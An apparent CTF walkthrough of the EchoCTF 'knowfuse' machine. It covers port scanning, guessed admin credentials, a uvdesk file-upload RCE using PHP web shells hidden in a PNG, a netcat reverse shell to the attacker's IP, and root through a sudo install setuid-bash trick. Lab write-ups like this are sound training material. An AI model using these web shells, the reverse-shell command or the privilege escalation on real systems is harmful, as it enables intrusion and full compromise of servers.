# knowfuse Writeup for EchoCTF

In this writeup, we will be walking through the steps to exploit a vulnerable version of [uvdesk](https://www.uvdesk.com/en/) and escalate privileges to root on knowfuse in EchoCTF.

### Step One: Port Discovery

We use [Nmap](https://nmap.org/) to scan the open ports 

```
nmap -p1-10000 -sCV -n -Pn -v [TARGET_IP] 
```

*p1-10000: Scans ports 1 through 10,000.  
sCV: Combines service detection (-sV) with default script scans (-sC) to enumerate service versions and vulnerabilities.  
n: Skips DNS resolution for faster scanning.  
Pn: Treats the target as online without pinging, useful for firewalled hosts.*

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/knowfuse/images/nmap%20scan.png)

We see port **22** (SSH) and port **80** (HTTP)

### Step Two: Getting In

We visit the HTTP website (port 80).  
We are prompted to the login page for the uvdesk **customer**. Now, this one is a bit tricky in the sense that you need to find the admin login page, not the customer login page. Do find this, we need to look at the documentation of uvdesk, which can be found through quick online search. In any case, the login portal for this challenge can be found in this url:

```
http://[TARGET_IP]/uvdesk/public/en/member/login
```

We head over to the **member** login page, and it asks for credentials. But where do we find these?  
 *Given that now, unlike other challenges, the site asks for an email and there are no default credentials for uvdesk, this was hard to find.*  

Taking a look at the challenge description, we see the following:  
`The easiest way to install knowledge into you through the power of fusion. Its as easy as calling our Adm1n and counting 123#`

Three key takeaways from this:  
1) We need to 'call the admin', which probably means that the username is admin-at-something.com 
2) The password is something along the lines of 123#  
3) 'Adm1n' also looks like a password!  

So, after many attempts and a lot of time trying different combinations, we finally find the login credentials
``admin@knowfuse.echocity-f.com``

``Adm1n123#``

Great! We are in! But now what?  

*Searching online for a uvdesk exploit, we find that on version 1.1.1 there is 'RCE via file upload' vulnerability.*   
Perfect!  

#### Step Three: Exploit uvdesk

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/knowfuse/images/location.png)

Going to the knowledgebase part of the dashboard and clicking **+NEW FOLDER**, we find the vulnerable image upload field.  

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/knowfuse/images/file%20upload%20vulnerability.png)
Next step is to get a reverse shell on the server using the vulnerability we just found.  

First of all, we need to open [BurpSuite](https://portswigger.net/burp). 
We select a PNG image, and then capture the upload request that is sent by clicking **SAVE CHANGES**.

Insert a php script into your image that will enable you to get a reverse shell.  
For example:

```php
 <?php system ($_GET['cmd']) ?>
 ```
 or

 ```php
 <?php passthru($_GET['cmd']); __halt_compiler(); ?>
 ```

It should look something like this
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/knowfuse/images/php%20shell%20on%20burp.png)

With our php script uploaded, we need to set up a reverse shell, which is done like so:

Open the bash console and type

```
nc -nlvp [YOUR_PORT]
```

Then, in the url of the image (*which can be copy+pasted from the page source*), we insert this payload to get a reverse shell    

`.../filename.php?cmd= nc -e /bin/bash [YOUR_IP] [YOUR_PORT]`

After we've successfully created a reverse shell, we need to see how we can escalate our privileges to root.

### Step Four: Getting Root

We have a connection! To pwn the machine, we finally have to get root privileges. Lets see how this is done.  

If we run   
`sudo -l`  
the server returns `/usr/bin/install` 

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/knowfuse/images/sudo%20-l.png)

After searching on [GTFObins](https://gtfobins.github.io/), i found that the [install](https://gtfobins.github.io/gtfobins/install/#sudo) binary file can be used for privilege escalation when ran with sudo.  
So, we use the file `/bin/bash` to get root privileges.

```
LFILE=/bin/bash
TF=$(mktemp)
sudo install -m 6777 $LFILE $TF
$TF -p
```  
![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/knowfuse/images/use%20of%20install%20binary%20for%20privilege%20escalation%20with%20proof%20(id).png)

And we have root!

### Final Thoughts

This challenge took me quite a while to complete, because figuring out how the install binary works was kind of tricky. Also, since I couldn't brute force or find the credentials, I actually had to use my brain for once.


From a techical standpoint, this challenge highlights how even a seemingly harmless file/command, could have devastating effects on a machine. By demonstrating such occurences in a virtual envirorment in a realistic fashion, we are able to learn how better to secure systems and servers.

PS: 
```
[YOUR_IP]= Your VPN IP 
[YOUR_PORT]= Custom port to use for netcat
[TARGET_IP]= IP of the machine you are hacking 
```
